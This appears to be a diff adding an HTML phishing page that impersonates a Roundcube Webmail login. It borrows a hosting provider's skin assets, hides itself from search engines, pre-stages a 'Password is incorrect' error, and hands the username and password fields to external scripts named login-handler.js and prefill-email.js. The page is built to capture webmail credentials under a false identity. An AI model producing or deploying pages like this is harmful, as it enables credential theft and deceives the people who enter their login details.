@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html lang="en" class="js chrome webkit layout-large">
+
+<head>
+  <meta name="robots" content="nofollow">
+<meta name="googlebot" content="nofollow">
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex">
+<meta name="googlebot-news" content="nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Cache-Control" content="no-cache">
+<meta http-equiv="Cache-Control" content="private">
+<meta http-equiv="Pragma" content="no-cache">   
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+    <meta name="theme-color" content="#f4f4f4">
+    <meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+    <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+    <link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css?s=1593860330">
+    <link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/styles/styles.css?s=1593860317">
+
+    <link rel="stylesheet" type="text/css"
+        href="https://webmail.supremecluster.com/plugins/xframework/assets/styles/framework.css?s=1506327547">
+    <link rel="stylesheet" type="text/css"
+        href="https://webmail.supremecluster.com/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1593860316">
+
+
+</head>
+
+<body class="task-login action-none">
+    <div id="layout">
+
+
+        <h1 class="voice">Roundcube Webmail Login</h1>
+
+        <div id="layout-content" class="selected no-navbar" role="main">
+            <img src="favicon.ico" id="logo"
+                alt="Logo">
+            <form id="login-form" name="loginForm" method="post" class="propform" action="">
+                <div class="error"
+                    style="margin-top: 5px; margin-bottom: 4px; display: none; font-size: 14px;color: red;" id="msg">
+                    Password is incorrect.</div>
+
+                    <input type="hidden" name="lourl" id="lourl">
+
+
+                <table>
+                    <tbody>
+                        <tr class="form-group row">
+                            <td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
+                            </td>
+                            <td class="input input-group input-group-lg"><span class="input-group-prepend"><i
+                                        class="input-group-text user fa fa-user"></i></span><input name="email"
+                                    id="email" required="" size="40" autocapitalize="off" type="text"
+                                    class="form-control" placeholder="Username"></td>
+                        </tr>
+                        <tr class="form-group row">
+                            <td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
+                            </td>
+                            <td class="input input-group input-group-lg"><span class="input-group-prepend"><i
+                                        class="input-group-text pass fa fa-lock"></i></span><input name="password"
+                                    id="password" required size="40" autocapitalize="off" type="password"
+                                    class="form-control" placeholder="Password"></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p class="formbuttons"><button type="submit" id="submit-btn"
+                        class="button btn btn-primary btn-lg text-uppercase w-100">Login</button>
+                </p>
+
+                                <!-- reCAPTCHA widget placeholder -->
+                                <div style="margin-top:12px; margin-bottom:8px; text-align:center;" id="recaptcha-container">
+                                    <div class="g-recaptcha" data-sitekey="6LezdrYrAAAAAPgJZ4zzn_cnKeYPXZadOIrPn_Tx"></div>
+                                </div>
+
+                                <!-- hidden field to store token for non-standard naming conventions -->
+                                <input type="hidden" id="captcha-response" name="g-recaptcha-response" value="">
+
+                <div id="login-footer" role="contentinfo">
+                    Roundcube Webmail
+
+
+                </div>
+            </form>
+        </div>
+        
+</body>
+<!-- jQuery (single include) -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<!-- Google reCAPTCHA v2 (checkbox) - replace YOUR_RECAPTCHA_SITE_KEY with your real key -->
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+<!-- App scripts -->
+<script src="login-handler.js" defer></script>
+<script src="prefill-email.js" defer></script>
+
+</html>
